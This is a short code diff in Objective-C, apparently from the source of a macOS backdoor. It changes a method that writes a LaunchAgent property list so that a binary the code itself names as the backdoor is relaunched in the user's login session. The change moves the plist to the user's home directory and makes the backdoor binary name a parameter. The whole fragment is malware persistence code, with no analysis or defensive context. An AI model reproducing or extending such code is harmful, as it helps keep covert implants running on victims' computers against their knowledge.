@@ -301,18 +301,16 @@ static RCSMUtils *sharedUtils = nil;
 }
 
 - (BOOL)createLaunchAgentPlist: (NSString *)aLabel
+                     forBinary: (NSString *)aBinary
 {
   NSMutableDictionary *rootObj = [NSMutableDictionary dictionaryWithCapacity: 1];
   NSDictionary *innerDict;
   
   NSString *ourPlist = [NSString stringWithFormat: @"%@/%@",
-                        [[[[[NSBundle mainBundle] bundlePath]
-                           stringByDeletingLastPathComponent]
-                          stringByDeletingLastPathComponent]
-                         stringByDeletingLastPathComponent],
-                        BACKDOOR_DAEMON_PLIST ];
+                        NSHomeDirectory(),
+                        BACKDOOR_DAEMON_PLIST];
   
-  NSString *backdoorPath = [NSString stringWithFormat: @"%@/%@", mBackdoorPath, gBackdoorName];
+  NSString *backdoorPath = [NSString stringWithFormat: @"%@/%@", mBackdoorPath, aBinary];
   innerDict = [[NSDictionary alloc] initWithObjectsAndKeys:
                aLabel, @"Label",
                @"Aqua", @"LimitLoadToSessionType",
